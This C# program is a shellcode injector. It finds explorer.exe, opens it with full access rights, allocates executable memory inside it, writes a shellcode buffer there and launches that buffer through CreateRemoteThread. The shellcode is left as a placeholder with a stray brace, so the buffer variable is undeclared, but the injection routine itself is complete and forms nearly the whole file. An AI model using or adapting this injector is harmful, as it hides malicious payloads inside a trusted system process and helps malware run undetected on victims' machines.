using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    static void Main()
    {
        Console.WriteLine("[*] Shellcode Injection into explorer.exe");

        // Injected shellcode
        PLACEHOLDER_SHELLCODE
        };

        // Step 1: Get the process ID of explorer.exe
        Process[] processes = Process.GetProcessesByName("explorer");
        if (processes.Length == 0)
        {
            Console.WriteLine("[!] Explorer.exe not found.");
            return;
        }
        uint processId = (uint)processes[0].Id;

        // Step 2: Open the process with required access
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);
        if (hProcess == IntPtr.Zero)
        {
            Console.WriteLine("[!] Failed to open process.");
            return;
        }
        Console.WriteLine($"[+] Opened process with ID: {processId}");

        // Step 3: Allocate memory in the remote process
        Console.WriteLine($"[*] Allocating {buf.Length} bytes in remote process...");
        IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x40);
        if (allocMem == IntPtr.Zero)
        {
            Console.WriteLine("[!] Memory allocation failed.");
            return;
        }
        Console.WriteLine($"[+] Allocated memory at: 0x{allocMem.ToInt64():X}");

        // Step 4: Write shellcode to allocated memory
        IntPtr bytesWritten;
        bool writeMem = WriteProcessMemory(hProcess, allocMem, buf, (uint)buf.Length, out bytesWritten);
        if (!writeMem)
        {
            Console.WriteLine("[!] WriteProcessMemory failed.");
            return;
        }
        Console.WriteLine("[+] Shellcode written!");

        // Step 5: Execute shellcode using CreateRemoteThread
        Console.WriteLine("[*] Creating remote thread...");
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, IntPtr.Zero);
        if (hThread == IntPtr.Zero)
        {
            Console.WriteLine("[!] CreateRemoteThread failed.");
            return;
        }
        Console.WriteLine($"[+] Remote thread created at: 0x{hThread.ToInt64():X}");
        Console.WriteLine("[*] Injection complete.");
        Console.ReadLine();
    }
}
